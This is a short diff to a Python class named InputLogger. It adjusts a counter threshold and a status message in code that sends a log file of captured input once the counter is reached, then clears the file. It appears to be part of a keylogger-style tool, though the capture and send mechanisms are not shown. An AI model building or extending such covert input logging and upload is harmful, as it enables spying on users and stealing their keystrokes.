@@ -40,8 +40,8 @@ class InputLogger:
 
     def increment_and_check_counter(self):
         self.counter += 1
-        if self.counter > self.counter_max:
-            send_log_file(f"SENDING LOG FILE: {self.log_file}", self.log_file)
+        if self.counter >= self.counter_max:
+            send_log_file(f"`Sending input logs...`", self.log_file)
             clear_log_file(self.log_file)
             log_info("Sent and cleared input log file.")
             self.counter = 0
